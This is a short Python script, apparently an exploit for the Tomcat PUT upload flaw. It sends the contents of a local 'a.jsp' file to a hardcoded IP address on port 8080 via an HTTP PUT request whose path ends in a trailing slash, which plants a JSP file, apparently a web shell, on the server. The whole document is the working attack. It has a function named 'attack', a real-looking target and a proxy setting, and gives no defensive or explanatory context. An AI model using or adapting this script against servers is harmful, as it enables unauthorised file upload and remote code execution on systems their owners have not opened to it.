import requests

def attack(url):
    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Edg/100.0.1185.50",
               "Content-Type":"application/x-www-form-urlencoded",
               }
    with open("a.jsp","r") as file:
        f = file.read()
    requests.put(url=url+'a.jsp/',headers=headers,data=f,proxies={"http":"http://127.0.0.1:8888"})

if __name__ == '__main__':
    attack("http://119.91.140.224:8080/")